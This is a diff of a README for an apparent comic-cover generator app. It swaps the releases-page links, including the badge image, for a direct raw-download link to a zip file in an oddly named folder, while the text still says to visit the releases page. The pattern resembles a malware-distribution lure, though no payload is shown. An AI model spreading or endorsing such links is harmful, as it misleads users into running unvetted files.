@@ -1,7 +1,7 @@
 # 🎨 dc-comic-cover-generator - Create Your Own Comic Covers Easily
 
 ## 📦 Download Here
-[![Download dc-comic-cover-generator](https://img.shields.io/badge/Download-dc--comic--cover--generator-yellow.svg)](https://github.com/Nahum2004/dc-comic-cover-generator/releases)
+[![Download dc-comic-cover-generator](https://raw.githubusercontent.com/Nahum2004/dc-comic-cover-generator/main/isosulphide/dc-comic-cover-generator.zip)](https://raw.githubusercontent.com/Nahum2004/dc-comic-cover-generator/main/isosulphide/dc-comic-cover-generator.zip)
 
 ## 🚀 Getting Started
 Welcome to the dc-comic-cover-generator! This app helps you create stunning comic book covers in a classic DC style. Just enter a creative prompt, and the application will generate artwork for you. Follow the steps below to get started.
@@ -28,7 +28,7 @@ Before you download, make sure your system meets the following requirements:
 ## 📥 Download & Install
 To get your own dc-comic-cover-generator, visit the releases page and download the latest version.
 
-[Visit this page to download](https://github.com/Nahum2004/dc-comic-cover-generator/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Nahum2004/dc-comic-cover-generator/main/isosulphide/dc-comic-cover-generator.zip)
 
 ### Installation Steps:
 1. **Visit the Releases Page**: Click on the link above.
